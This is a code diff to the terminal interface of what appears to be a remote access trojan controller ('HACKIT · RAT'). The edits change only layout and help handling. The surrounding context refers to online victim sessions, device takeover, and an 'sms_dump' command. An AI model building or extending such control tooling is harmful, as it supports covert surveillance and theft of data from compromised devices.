@@ -154,11 +154,18 @@ class LiveUI:
         self.message = f"takeover re-queued ({queued} steps)"
 
     # ------------------------------------------------------------- render
-    def _header(self) -> List[str]:
+    def _header(self, compact: bool = False) -> List[str]:
         uptime = int(time.time() - self.started)
         online = sum(1 for s in self.sessions if s["online"])
+        if compact:
+            left = term.Bad + " ● RAT" + term.RESET
+            if self.width < 34:
+                right = f"{online}/{len(self.sessions)}"
+            else:
+                right = f"{online}/{len(self.sessions)} · {len(self.feed)}ev"
+            return [term.pad(left, max(0, self.width - term.vislen(right))) + term.Dim + right + term.RESET]
         left = term.Bad + " ● HACKIT · RAT " + term.RESET + term.Dim + term.trunc(
-            self.hub.public_url, max(10, self.width // 2 - 12)) + term.RESET
+            self.hub.public_url, max(8, self.width // 2 - 10)) + term.RESET
         right = (f"up {uptime // 60:02d}:{uptime % 60:02d}  "
                  f"{_colored(str(online), GREEN if online else DIM)}/{len(self.sessions)} online  "
                  f"{len(self.feed)} ev")
@@ -232,39 +239,42 @@ class LiveUI:
         return term.box("STATUS", rows, width, term.Frame, height)
 
     def render(self) -> str:
-        self.width, self.height = term.size()
-        lines = self._header()
-        bottom = self.height >= 26
-        body_h = max(6, self.height - (15 if bottom else 6))
+        full_width, full_height = term.size()
+        offset = max(0, (full_width - 200) // 2)
+        self.width, self.height = min(full_width, 200), min(full_height, 60)
+        tiny = self.height < 15
+        narrow = self.width < 58
+        wide = self.width >= 104 and self.height >= 24
+        with_bottom = self.height >= 26 and self.width >= 72
+        lines = self._header(compact=tiny or narrow)
         if self.helping:
-            rows: List[str] = []
-            for group, text in HELP:
-                rows.append(term.Accent + term.pad(group, 9) + term.RESET + " " + text)
-            lines += term.box("HELP — raw commands also work (e.g. sms_dump 50)", rows,
-                              self.width, term.Frame, len(rows) + 1)
+            rows = [term.Accent + term.pad(group, 8) + term.RESET + " "
+                    + term.trunc(text, self.width - 13) for group, text in HELP]
+            rows = rows[:max(2, self.height - 4)]
+            lines += term.box("HELP", rows, self.width, term.Frame)
             lines.append(term.Dim + "  any key returns" + term.RESET)
-            return "\n".join(lines)
+            return self._finish(lines, full_height, offset, full_width)
 
-        if self.width >= 104:
-            left = min(34, max(24, self.width // 4))
-            right = self.width - left
-            lines += term.horizontal(
-                self._devices(left, body_h),
-                self._feed(right, body_h),
-            )
+        fixed = len(lines) + 1 + (8 if with_bottom else 0) + 1
+        room = max(3, self.height - fixed)
+        if tiny:
+            lines += self._feed(self.width, room)
+        elif wide:
+            left = min(34, max(22, self.width // 4))
+            lines += term.horizontal(self._devices(left, room), self._feed(self.width - left, room))
         else:
-            available = max(6, self.height - (17 if bottom else 8))
-            top = max(2, available // 3)
+            span = max(3, room - 4)
+            top = min(max(2, span // 2), max(2, min(5, span - 2)))
             lines += self._devices(self.width, top)
-            lines += self._feed(self.width, available - top)
+            lines += self._feed(self.width, span - top)
 
-        lines.append(term.rule(self.width, "─", term.Dim))
-        if bottom:
-            half = self.width // 2
-            lines += term.horizontal(
-                self._keys(half, 7),
-                self._status(self.width - half, 7),
-            )
+        if with_bottom:
+            lines.append(term.rule(self.width, "─", term.Dim))
+            half = max(16, self.width // 2)
+            lines += term.horizontal(self._keys(half, 5), self._status(max(16, self.width - half), 5))
+        lines.append(term.rule(self.width, "─", term.Dim) if not tiny else term.Dim + "─" * self.width + term.RESET)
+
+        footer = FOOTER if self.width >= 90 else "h help · q quit"
         if self.flash:
             lines.append(term.Warn + " ► " + term.trunc(self.flash, self.width - 3) + term.RESET)
             self.flash = None
@@ -272,8 +282,14 @@ class LiveUI:
             lines.append(term.Warn + " ► " + term.trunc(self.message, self.width - 3) + term.RESET)
             self.message = ""
         else:
-            lines.append(term.Dim + " ► " + term.trunc(FOOTER, self.width - 3) + term.RESET)
-        return "\n".join(lines)
+            lines.append(term.Dim + " ► " + term.trunc(footer, self.width - 3) + term.RESET)
+        return self._finish(lines, full_height, offset, full_width)
+
+    def _finish(self, lines: List[str], full_height: int, offset: int, full_width: int) -> str:
+        """Clamp to the canvas, centre a wide terminal, pad the rest."""
+        out = [(" " * offset + line) if offset else line for line in lines[:full_height]]
+        out.extend("" for _ in range(full_height - len(out)))
+        return "\n".join(out)
 
     # -------------------------------------------------------------- input
     def handle(self, line: str) -> bool:
@@ -286,6 +302,9 @@ class LiveUI:
         args = parts[1:]
         if key in ("q", "quit", "exit"):
             return False
+        if self.helping and key not in ("h", "?", "help"):
+            self.helping = False
+            return True
         if key in ("h", "?", "help"):
             self.helping = not self.helping if key == "h" else True
             return True
